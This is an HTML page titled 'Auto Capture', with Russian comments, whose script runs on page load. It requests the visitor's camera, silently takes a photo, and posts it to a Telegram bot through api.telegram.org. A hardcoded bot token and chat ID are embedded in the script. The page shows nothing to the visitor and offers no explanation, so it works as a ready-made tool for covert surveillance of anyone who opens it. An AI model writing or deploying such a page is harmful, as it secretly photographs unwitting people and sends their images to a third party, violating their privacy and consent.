<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture</title>
</head>
<body>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        const BOT_TOKEN = "8186769001:AAHQ-3PT9NHqPbZTXvCinuMAhKpQJX2QQ68"; // Замени на новый токен
        const CHAT_ID = "7717007781"; // Твой chat_id

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);

                return imageCapture.takePhoto(); // Захватываем фото
            })
            .then(blob => {
                sendPhoto(blob); // Отправляем в Telegram
            })
            .catch(error => console.error("Ошибка доступа к камере:", error));

        function sendPhoto(blob) {
            let formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log("Отправлено:", data))
            .catch(error => console.error("Ошибка отправки:", error));
        }
    </script>
</body>
</html>
